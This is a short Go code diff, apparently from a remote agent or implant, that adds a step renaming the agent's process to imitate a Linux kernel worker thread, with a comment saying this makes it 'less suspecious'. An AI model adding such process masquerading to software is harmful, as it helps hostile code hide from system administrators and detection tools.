@@ -38,6 +38,11 @@ func main() {
 	version := flag.Bool("version", false, "Show version info")
 	flag.Parse()
 
+	// rename our agent process to make it less suspecious
+	agent.SetProcessName(fmt.Sprintf("[kworker/%d:%d-events]",
+		util.RandInt(1, 20),
+		util.RandInt(0, 6)))
+
 	// applyRuntimeConfig
 	err = agent.ApplyRuntimeConfig()
 	if err != nil {
